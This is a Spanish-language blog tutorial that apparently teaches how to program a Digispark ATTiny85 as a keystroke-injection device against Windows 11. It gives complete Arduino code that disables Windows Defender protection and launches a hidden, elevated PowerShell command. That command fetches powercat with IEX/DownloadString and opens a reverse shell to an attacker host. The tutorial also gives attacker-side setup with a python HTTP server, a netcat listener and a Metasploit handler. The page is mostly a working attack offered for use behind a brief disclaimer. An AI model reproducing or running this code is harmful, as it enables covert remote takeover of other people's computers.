<!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Reverse Shells - Wiredl4bs blog</title>
                    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
                    <link rel="stylesheet" href="../views/header.css">
                </head>
                <body>
                <nav class="nav justify-content-start bg-dark">
    <a class="nav-link active link-light" href="/"><i class="nf nf-md-web">&MediumSpace;</i>Wiredl4bs</a>
    <a title="Run 'Inicio'" class="nav-link active link-light" href="/"><i class="nf nf-cod-debug_start"></i></a>
    <a class="nav-link active link-light" href="/posts.php">Posts</a>
    <a class="nav-link active link-light" href="/contact.php">Contact</a>
    <a class="nav-link active link-light" href="/about-me.php">About me</a>
</nav><br><br>
                    <div class="container">
                    <p><img src="/assets/img/2023-01-09/reverse-shell.png" alt="Reverse Shell Post Banner" />
En este post vamos a reprogramar un controlador Arduino para que se comporte como un dispositivo HID (vamos como un teclado) para que lance una serie de comandos que nos permitan acceder a la shell de un dispositivo Windows 11 en la misma red. </p>
<p>No me hago responsable de los daños que pueda causar el mal uso de este tutorial, la responsabilidad recaerá en quién haga uso de estas técnicas con finalidades no éticas.</p>
<h3>El controlador</h3>
<p>Para este tutorial usaremos un microcontrolador compatible con Arduino llamado <strong>Digispark ATTiny85</strong> se puede encontrar en tiendas como Aliexpress por 2€.
<img src="/assets/img/2023-01-09/attiny85.jpeg" alt="Foto del microcontrolador" />
Para que la placa funcione con el <a href="https://www.arduino.cc/en/software">Arduino IDE</a> deberemos instalar los 'drivers' del microcontrolador. Para instalarlos deberás acceder a &quot;Archivo&quot;&gt;&quot;Preferencias&quot; y en &quot;Gestor de URLs adicionales de tarjetas&quot; añadiremos la siguiente URL: <code>http://digistump.com/package_digistump_index.json</code> <img src="/assets/img/2023-01-09/preferencias.png" alt="Captura de pantalla" />
Después de haber añadido el URL pulsaremos en &quot;Herramientas&quot;&gt;&quot;Placas&quot;&gt;&quot;Gestor de tarjetas&quot;. <img src="/assets/img/2023-01-09/gestor_placas.png" alt="" /></p>
<p>Y en el gestor de tarjetas buscaremos &quot;Digistump AVR Boards&quot; y pulsaremos instalar.</p>
<p><img src="/assets/img/2023-01-09/instalacion.png" alt="" /></p>
<p>Por ahora iba todo genial pero hay un problema, la librería &quot;DigiKeyboard.h&quot; que se encarga de convertir el microcontrolador en un teclado viene en distribución de teclado americano por lo que si intentamos de explotar un sistema con la distribución de teclado español tendremos problemas.</p>
<p>Realmente tiene facil solución gracias a <a href="https://github.com/Dasor/digispark-keyboard-layout-Spanish">este repo de github</a></p>
<p>Nos podemos bajar los ficheros &quot;DigiKeyboard.h&quot; y &quot;scancode-ascii-table.h&quot; usando <code>curl</code> o <code>wget</code>. En mi caso usaré curl.</p>
<pre><code class="language-bash">curl -s -o DigiKeyboard.h https://raw.githubusercontent.com/Dasor/digispark-keyboard-layout-Spanish/master/DigiKeyboard.h
curl -s -o scancode-ascii-table.h https://raw.githubusercontent.com/Dasor/digispark-keyboard-layout-Spanish/master/scancode-ascii-table.h</code></pre>
<p>Si usas Windows debes de reemplazar <code>curl</code> por <code>curl.exe</code> ya que las versiones recientes de Windows incluyen esta herramienta de manera predeterminada.</p>
<p>Luego deberemos reemplazar los archivos que acabamos de descargar por los de la librería DigisparkKeyboard. Solo tendríamos que reemplazar los archivos en
<br></p>
<pre><code>(Linux) $HOME/.arduino/packages/digistump/hardware/avr/(versión)/libraries/DigisparkKeyboard/</code></pre>
<pre><code>(Windows) C:\Users\(NombreDeUsuario)\AppData\Local\Arduino15\packages\digistump\hardware\avr\(version)\libraries\DigisparkKeyboard\</code></pre>
<p>Con esto ya podemos explotar sistemas españoles(o usando una distribución de teclado española).</p>
<h3>Picando código</h3>
<p>Al principio del archivo se importa la librería <code>DigiKeyboard.h</code> y se definen distintas teclas que usaremos más tarde (Esc, Tab, Space).</p>
<pre><code class="language-cpp">#include "DigiKeyboard.h"

#define KEY_ESC     41 
#define KEY_TAB     43
#define KEY_SPACE   44</code></pre>
<p>Inicializamos el LED para que nos informe al terminar el ataque y lo dejamos apagado.</p>
<pre><code class="language-cpp">void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);
}</code></pre>
<p>Para poder crear una reverse shell deberemos de desactivar Windows Defender, de esto se encarga la función <code>disarm_defender()</code>.</p>
<pre><code class="language-cpp">void disarm_defender() {
  // abre el buscador de windows
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(700);

  // abre la configuración de seguridad
  DigiKeyboard.print(F("seguridad"));
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // deshabilita la protección a tiempo real
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // cierra la ventana
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  }</code></pre>
<p>Con esto ya Windows nos permitiría correr el siguiente snippet de código en powershell. </p>
<pre><code class="language-powershell">PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}</code></pre>
<p>Vamos a analizarlo:</p>
<pre><code class="language-powershell">PowerShell.exe -WindowStyle hidden{}</code></pre>
<p>Ejecuta las instrucciones dentro de las llaves y esconde la terminal de PowerShell de manera que no la detecte el usuario.</p>
<pre><code class="language-powershell">powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');"</code></pre>
<p>Como posteriormente veremos, para realizar este ataque tendremos que crear un servidor HTTP en caso de que el objetivo no tenga conexión a Internet para que se descargue powercat (Lo usaremos para crear la reverse shell porque es fácil de manejar y porque normalmente las máquinas Windows no tienen Netcat instalado). Si sabes que el objetivo tiene conexión a Internet, a lo mejor te es más conviniente introducir el URL del archivo powercat.ps1 <code>https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</code>. En resumen, este snippet sirve para bajarse el fichero powercat.ps1 ya sea de un servidor que hostea el atacante o del propio repositorio de Github.</p>
<pre><code class="language-powershell">powercat -c (IP) -p (PUERTO) -e powershell\</code></pre>
<p>Este snippet sirve para conectarnos al atacante lanzando un intérprete de powershell (Deberemos de poner la IP del atacante y el puerto que está en escucha en la máquina atacante). Esto hace que el atacante tome control del sistema ya que como ahora veremos vamos a conseguir lanzar este snippet como administrador.</p>
<p>Con el siguiente código abriríamos powershell y ejecutaríamos el comando con perisos de administrador.</p>
<pre><code class="language-cpp">void create_reverse_shell (){
    //abre powershell con permisos de administrador
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print(F("powershell"));
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT|MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    // RECORDATORIO: Puedes cambiar el URL al archivo de powercat si el objetivo tiene conexión a internet. (Así nos ahorramos tener el servidor HTTP)
    DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
    // esconde la ventana al usuario y nos permite tomar el control completo del sistema
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}</code></pre>
<p>Lo que resta para terminar el programa es añadir el método <code>loop()</code>. Este método se encargará de lanzar las funciones definidas anteriormente y cuando termine apagará y encenderá el LED del microcontrolador.</p>
<pre><code class="language-cpp">void loop() {
  DigiKeyboard.sendKeyStroke(0);

  disarm_defender();
  create_reverse_shell();

  while (true){
      digitalWrite(1, HIGH);
      delay(300);
      digitalWrite(1, LOW);
      delay(300);
  }
}</code></pre>
<p>Os dejo el código en <a href="https://github.com/404a10/reverse-shell-arduino">mi perfil de Github</a>.</p>
<p>Flasheamos el código al microcontrolador y preparamos el lado del atacante.</p>
<h3>Si sabemos que el objetivo no tiene conexión a Internet</h3>
<p>Nos descargaremos el archivo de powercat a un directorio y desde ahí montaremos un servidor HTTP en el que serviremos el archivo para que la víctima pueda descargarlo para posteriormente ejecutarlo. Necesitaríamos tener instalado <code>python3</code>.
Navegas al directorio en el que esté el archivo y servirlo usando </p>
<pre><code class="language-bash">python3 -m  http.server 80</code></pre>
<p><strong>Recordatorio:</strong><br>
Para que esto funcione deberás de cambiar la parte del programa que se encarga de ejecutar el snippet en powershell para que descargue powercat desde el servidor HTTP.
Cambiamos de esto:</p>
<pre><code class="language-powershell">DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");</code></pre>
<p>A esto:</p>
<pre><code class="language-powershell">DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");</code></pre>
<h3>Esperar a la conexión</h3>
<p>Como ya sabrás, el atacante debe esperar la conexión del cliente, para esperar la conexión que generará la máquina víctima al conectarse el microcontrolador.</p>
<p>Podemos esperar la conexión del atacante usando herramientas como <code>netcat</code> y <code>metasploit</code>. Para esperar a conexiones entrantes en <code>netcat</code> podríamos hacerlo de esta manera:</p>
<pre><code class="language-bash">nc -lvp (PUERTO)</code></pre>
<p>El parámetro -l sirve para esperar a conexiones entrantes, -v es para activar la verbosa y poder ver más información en la pantalla mientras que -p sirve para especificar el puerto en el que estamos escuchando.</p>
<p>Usando metasploit podríamos hacerlo de la siguiente manera:</p>
<pre><code class="language-bash">msfconsole
use exploit/multi/handler
set LHOST (IP de la interfaz del atacante conectada a la red de la victima)
set LPORT (PUERTO en el que queremos recibir conexiones)
run</code></pre>
<p>Esto sería todo, muchas gracias por leer,
<br>
<code>Happy Hacking!</code></p>
<p><br><br>
<strong>Si encuentras algún error o errata házmelo saber.</strong></p>
                    </div>
                <footer class="bg-secondary-subtle container-fluid">
    <div class="container">
        <div class="row">
            <div class="col text-center" style="margin-top: 10px;">
                <h2>Wiredl4bs</h2>
                <span>Your favourite tech blog.<br>My socials:</span>
                <div>
                    <a class="link-dark link-offset-2 link-underline link-underline-opacity-0" href="https://github.com/th3-m0th"><i class="nf nf-cod-github"></i></a>
                    <a class="link-dark link-offset-2 link-underline link-underline-opacity-0" href="https://gitlab.com/th3-m0th"><i class="nf nf-fa-gitlab"></i></a>
                    <a class="link-dark link-offset-2 link-underline link-underline-opacity-0" href="https://instagram.com/wiredl4bs"><i class="nf nf-fa-instagram"></i></a>
                </div><br>
            </div>
            <div class="col text-center" style="margin-top: 10px;">
                <h3>Enlaces:</h3>
                <a class="link-dark link-offset-2 link-underline link-underline-opacity-0" href="<br />
<b>Warning</b>:  Undefined variable $URL in <b>/home/vol5_3/infinityfree.com/if0_35507336/htdocs/views/footer.html</b> on line <b>15</b><br />
">Home</a><br>
                <a class="link-dark link-offset-2 link-underline link-underline-opacity-0" href="about-me">About me</a><br>
                <a class="link-dark link-offset-2 link-underline link-underline-opacity-0" href="contact">Contact</a><br>
                <a class="link-dark link-offset-2 link-underline link-underline-opacity-0" href="contact">Posts</a><br>
            </div>
            <span class="text-center" style="padding-bottom: 5px; margin-top: 5px;">Wiredl4bs &copy; 2023</span>
        </div>
    </div>
</footer>
                </body>
                </html>